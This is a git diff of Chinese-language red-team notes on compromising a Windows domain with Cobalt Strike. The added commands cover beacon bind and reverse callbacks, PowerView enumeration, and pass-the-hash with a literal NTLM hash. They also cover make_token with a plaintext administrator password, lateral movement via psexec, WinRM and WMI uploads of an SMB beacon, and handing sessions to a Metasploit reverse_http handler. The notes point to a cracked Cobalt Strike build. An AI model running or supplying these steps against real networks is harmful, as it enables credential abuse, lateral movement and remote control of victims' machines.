@@ -125,9 +125,24 @@ Rubeus 的 `dump` 命令将从内存中提取这些票证 - 但由于它使用
 
 
 # 域内技术
+#### 内网上线 CS
+- 正向链接
+生成 Beacon TCP , 0.0.0.0 4444
+拿到域内 shell 后上传执行 exe，外网主机 connect 域内执行 exe 的主机
+```
+connect 10.0.20.99 4444  
+```
+
+- 反向链接
+转发上线 -> 监听地址选择能访问的内网主机 ip -> Save
+直接 exe 上线即可
+
+
 #### 枚举
 PowerView
 ```bash
+beacon> powershell-import C:\Users\13461\Desktop\KALI_Tools\PowerView.ps1
+
 beacon> powershell Get-Domain [-Domain]（有用的信息包括域名、林名称和域控制）
 beacon> powershell Get-DomainController [-Domain] | select Forest, Name, OSVersion | fl （返回当前域或指定域的域控制器）
 beacon> powershell Get-ForestDomain [-Forest] (返回当前林或 `-Forest` 指定的林的所有域)
@@ -146,8 +161,47 @@ https://github.com/tevora-threat/SharpView
 beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
 ```
 
-#### Hash 传递
+
+#### 用户模拟
+-  Hash 传递
 ```bash
-beacon> pth vuln 32ed87bdb5fdc5e9cba88547376818d4 (模拟hash会话)
-beacon> rev2self (恢复会话)
+beacon> pth win2016\system 570a9a65db8fba761c1008a51d4c95ab (模拟hash会话)
+beacon> rev2self (恢复初始会话)
 ```
+
+- make_token
+```bash
+beacon> make_token win2016\administrator Admin@123
+beacon> remote-exec psexec/winrm/wmi win2016 whoami
+```
+
+
+#### 横向移动
+```
+beacon> jump winrm64 win2016 smb   (返回一个高完整性Beacon，该会话以交互的用户身份运行)
+beacon> jump psexec64 win2016 smb (Beacon用户为SYSTEM)
+```
+
+- WMI
+```
+beacon> cd C:\progarmdata\
+beacon> upload C:\Users\13461\Desktop\CobaltSrike_4.9.1_Cracked_www.ddosi.org\Payloads\smb_x64.exe
+beacon> remote-exec wmi win2016 C:\programdata\smb_x64.exe
+beacon> link win2016 msagent_cf
+```
+*其中, msagent_cf 为 smb_beacon 的 pipe 名字
+
+
+#### 会话传递
+- CS 上线主机 -> MSF
+*Beacon 一定是得是 Stageless 的 reverse_http, 并且 Foreign 的 HTTP port 是没有被使用过的
+```bash
+msfconsole -q
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+...
+msf6 exploit(multi/handler) > run
+
+beacon> spawn msf
+```
+在 msf 中即可收到会话
